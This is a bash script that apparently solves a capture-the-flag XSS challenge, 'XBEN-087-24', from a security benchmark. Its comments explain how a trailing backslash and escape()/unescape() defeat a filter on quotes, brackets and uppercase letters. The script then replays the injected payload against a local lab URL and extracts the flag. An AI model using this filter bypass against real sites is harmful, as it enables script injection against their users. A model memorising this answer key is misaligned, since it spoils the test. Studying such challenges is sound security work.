#!/usr/bin/env bash
# XBEN-087-24 — "Dalgona Challenges", umbrella (tags: xss)
#
# The hardest of the set. The parameter lands inside `var name = "…";`, and the
# filter rejects `<`, `>`, `'`, `[`, `]` and *every uppercase letter*, then
# escapes each `"` to `\"`.
#
# Two things follow. There is no way out of the string by quoting, and no string
# literal can be written once you are out: every `"` you send comes back
# backslashed. And no uppercase means no `charAt`, no `toString`, no
# `String.fromCharCode`; no brackets means no computed property access either.
# So the message "XSS" cannot be typed, spelled or built by any of the usual
# routes.
#
# The way out is the escaping itself. Send a trailing `\` before the quote and
# the filter turns your `"` into `\"`, so the source reads `"\\"` — a string
# holding one backslash — and the statement ends there. That backslash is then
# the only interesting character in the program, and it is exactly what is
# needed: `escape()` leaves letters, digits and `@*_+-./` alone but percent-
# encodes a backslash, so `escape(name)` is "%5C" and its first character is the
# `%` that no literal could provide. `unescape("%58%53%53")` is "XSS", with the
# digits written as numbers and concatenated onto that one borrowed character.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben087-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'query.name=\";p=escape(name).substr(0,1);alert(unescape(p+5+8+p+5+3+p+5+3));//' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
